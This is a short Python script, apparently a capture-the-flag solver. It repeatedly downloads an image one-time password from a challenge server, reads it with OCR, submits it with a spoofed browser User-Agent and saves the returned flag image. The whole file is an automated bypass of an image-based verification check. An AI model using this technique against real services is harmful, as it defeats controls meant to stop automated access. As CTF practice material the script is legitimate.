import random

import requests
import pytesseract as tess
from PIL import Image


#tess.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

for i in range(0,100):
    r = requests.get("http://challenge.ctf.games:31264/static/otp.png", stream=True)
    image_url = "http://challenge.ctf.games:31264/static/otp.png"
    filename = image_url.split("/")[-1]
    with open(filename, 'wb') as f:
        f.write(r.content)
        f.close()
        img = Image.open(r"otp.png")
        text = tess.image_to_string(img)
        code = text[0:8]
        headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        payload = f'otp_entry={code}'
        print(payload)
        resp = requests.post('http://challenge.ctf.games:31264/', {'otp_entry':code}, headers=headers)
        r1 = requests.get("http://challenge.ctf.games:31264/static/flag.png", stream=True)
        with open(f'{random.randint(1, 1000000)}.png', 'wb') as f:
            f.write(r1.content)